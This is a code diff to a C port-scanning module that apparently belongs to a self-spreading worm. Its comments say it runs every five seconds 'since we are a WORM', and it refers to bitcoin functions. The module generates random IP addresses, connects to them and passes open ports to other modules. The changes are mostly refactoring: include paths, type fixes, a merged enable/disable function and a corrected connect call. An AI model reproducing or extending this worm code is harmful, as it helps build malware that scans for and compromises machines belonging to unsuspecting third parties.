@@ -11,9 +11,12 @@ if an IP is open for one port we will attempt all searches because itll be quick
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
-#include "../../list.h"
-#include "../../structs.h"
-#include "../../utils.h"
+#include <stdint.h>
+#include <string.h>
+#include <time.h>
+#include "list.h"
+#include "structs.h"
+#include "utils.h"
 #include "portscan.h"
 
 // lets set the maximum amount of scans to attempt simultaneously
@@ -24,10 +27,10 @@ if an IP is open for one port we will attempt all searches because itll be quick
 Portscan *portscan_list = NULL;
 
 // adds a port to the scanning list.. and the module to send the connection to afterwards
-int Portscan_Add(Module *module, int port) {
+int Portscan_Add(Modules *module, int port) {
     Portscan *pptr = NULL;
     
-    if ((pptr = L_add((LIST **)&portscan_list, sizeof(Portscan))) == NULL)
+    if ((pptr = (Portscan *)L_add((LIST **)&portscan_list, sizeof(Portscan))) == NULL)
         return -1;
         
     pptr->module = module;
@@ -48,20 +51,10 @@ Portscan *Portscan_FindByPort(int port) {
 }
 
 // enable a port scan
-int Portscan_Enable(int port) {
+int Portscan_Enable(int port, int flag) {
     Portscan *pptr = Portscan_FindByPort(port);
     if (pptr) {
-        pptr->enabled = 1;
-        return 1;
-    }
-    return 0;
-}
-
-// disable a port scan
-int Portscan_Disable(int port) {
-    Portscan *pptr = Portscan_FindByPort(port);
-    if (pptr) {
-        pptr->enabled = 0;
+        pptr->enabled = flag;
         return 1;
     }
     return 0;
@@ -90,7 +83,7 @@ Modules HACK_portscan = {
     0, 0,
     // required 0, 0..  
     0, 0,
-    //timer = 300 seconds (5min) - get new nodes, etc
+    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
     // we will run this every 5 seconds since we are a WORM
     5,
     // bitcoin functions
@@ -101,7 +94,7 @@ Modules HACK_portscan = {
 
 
 // initialize the module
-int Portscan_Init(Modules **_module_list) {
+int portscan_init(Modules **_module_list) {
     Module_Add(_module_list, &HACK_portscan);
 }
 
@@ -137,9 +130,10 @@ int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
     int cur_ts = time(0);
     Connection *cptr = mptr->connections;
     int count = 0;
-    int z = 0, a = 0, c = 0, port = 0, x= 0,  d = 0;
-   int scan_count = 0;
+    int z = 0, a = 0, c = 0, port = 0, x = 0,  d = 0;
+    int scan_count = 0;
     Portscan *pptr = NULL;
+    
     // we have to check timeouts here.. just in case the OS timeouts arent working well..
     // all ports should be non blocking, and select() will determine if theres an error, or if it opens correctly
     // however the OS timeout may be too high..
@@ -186,7 +180,7 @@ int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
                 unsigned int ip = IPGenerate();
                 
                 // connect to this new ip
-                c = tcp_connect(note, note->connections, ip, port, &cptr);
+                c = tcp_connect(mptr, &mptr->connections, ip, port, &cptr);
 
                 // if it worked.. we count it in z                    
                 if (c) {
